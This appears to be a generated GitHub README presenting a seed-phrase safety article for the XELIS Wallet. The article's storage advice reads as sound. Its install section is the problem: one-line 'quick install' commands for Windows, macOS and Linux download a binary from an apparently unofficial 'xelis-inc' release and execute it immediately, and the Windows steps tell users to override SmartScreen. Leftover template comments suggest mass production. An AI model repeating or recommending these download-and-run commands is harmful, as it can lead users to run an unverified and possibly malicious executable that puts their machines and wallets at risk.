![Keep a seed phrase safe: XELIS Wallet storage mistakes](assets/banner-article.png)
# Keep a seed phrase safe: XELIS Wallet storage mistakes

The five storage decisions that lose wallets, and what to do instead.

## Downloads - Phrase safety

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> A phrase written down once and never tested is a hope, not a backup.

A seed phrase is only as safe as its weakest copy. Write it offline, in order, with a second copy in a different place, and never let a photograph, a chat draft or a single password manager entry become the only record.

<!-- ARTICLE-BODY-BEGIN -->
## The mistakes that actually lose wallets

| Mistake | What goes wrong | Do this instead |
| --- | --- | --- |
| Photographing the screen | The image syncs to a photo library and outlives deleting it on the phone | Write the words by hand and never capture the screen |
| Chat draft or email to yourself | Copies sit on servers outside your control | Keep the record on paper or metal, offline |
| Password manager as the only copy | The device is online, which is where phrase-stealing software looks first | Use it as an extra copy, never the only one |
| One copy next to the computer | Fire, flood or theft takes both together | Store the second copy somewhere else |
| Typing it into a checker site | The site has the phrase the moment you press enter | Test it by restoring in the wallet instead |

None of these is exotic. They are ordinary convenience decisions, made once, that turn a recoverable wallet into an unrecoverable one.

## What offline should mean in practice

Paper survives a drawer, not a fire. Metal survives both and is conspicuous if someone finds it. Either is fine as long as two conditions hold: the copy is not reachable from any device, and a second copy exists in a different building.

Number the words and record them in the order the wallet showed them. Spelling matters as much as order, and a single wrong word produces a different, empty wallet rather than an error message. The capture procedure itself is in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md">XELIS Wallet backup procedure</a>.

## Testing the copy without gambling

The only honest test is a restore: install the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> on another machine or a fresh user account, choose the restore path, and type the phrase from the written copy. If the address that appears matches the original, the copy works.

If it does not match, stop and re-read the paper rather than assuming the wallet is broken. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md">Restore a XELIS Wallet wallet</a> walks through the comparison, and it is the step that converts a written phrase into a verified backup.

## If a copy has already been exposed

A phrase that has been photographed, pasted into a chat or typed into a website cannot be un-exposed. No service can reverse that, and nobody can revoke the words. The sound response is a new wallet with a new phrase, funded by a transfer from the old one, made from a machine you trust.

Never send the phrase to anyone who offers to check or recover it. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md">XELIS Wallet self-custody</a> explains why no recovery desk exists for a self-custodial wallet, which is the reason those offers are always false.

## FAQ
### Which crypto wallet cannot be hacked?
None. Every wallet is software running on a machine, and the machine is the attack surface. Storage habits reduce the risk; nothing removes it.

### Can your crypto wallet get hacked?
The encrypted file can be stolen and the phrase can be copied, but the encryption is rarely what fails: the capture and storage around it are. A clean machine and an offline phrase are the defences.

### How do you know if your wallet has been hacked?
Unexplained outgoing transactions are the signal. Compare history with what you actually sent, and treat any payment you did not make as a compromise of the machine rather than of the chain.

### How to protect your crypto wallet from hackers?
Keep the phrase offline in two places, install only from the release page, keep the operating system updated, and type the phrase nowhere except the wallet's own restore flow.

### Where should I store my XELIS Wallet seed phrase?
Offline, in two physically separate places, on paper or metal, with the words numbered. A password manager can be an extra copy, never the only one.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet backup procedure](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md)
- [Restore a XELIS Wallet wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md)
- [XELIS Wallet self-custody](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [XELIS Wallet local data](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md)
